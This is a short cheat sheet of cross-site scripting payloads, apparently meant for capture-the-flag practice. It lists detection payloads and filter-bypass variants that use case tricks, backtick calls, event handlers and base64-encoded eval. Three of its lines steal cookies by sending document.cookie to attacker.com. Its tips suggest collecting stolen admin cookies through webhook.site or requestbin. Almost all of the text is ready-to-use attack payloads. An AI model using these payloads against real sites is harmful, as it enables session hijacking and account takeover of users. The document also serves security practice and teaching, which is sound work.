# Cross-Site Scripting (XSS)

## Detection Payloads
```html
<script>alert(1)</script>
"><script>alert(1)</script>
'><script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(1)
```

## Steal Cookies / Exfiltrate Data
```html
<script>fetch('http://attacker.com/?c='+document.cookie)</script>
<img src=x onerror="fetch('http://attacker.com/?c='+document.cookie)">
<script>new Image().src='http://attacker.com/?c='+document.cookie</script>
```

## Filter Bypass
```html
<!-- Case bypass -->
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x ONERROR=alert(1)>

<!-- No parentheses -->
<script>alert`1`</script>
<img src=x onerror=alert`1`>

<!-- No quotes/spaces -->
<svg/onload=alert(1)>

<!-- Event handlers -->
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>

<!-- Encoded -->
<script>eval(atob('YWxlcnQoMSk='))</script>
```

## CTF XSS Tips
- In CTF, XSS is often used to steal admin cookies or trigger admin actions
- Check for CSP headers - may need bypass
- Use webhook.site or requestbin to receive exfiltrated data
- Look for DOM-based XSS in client-side JavaScript
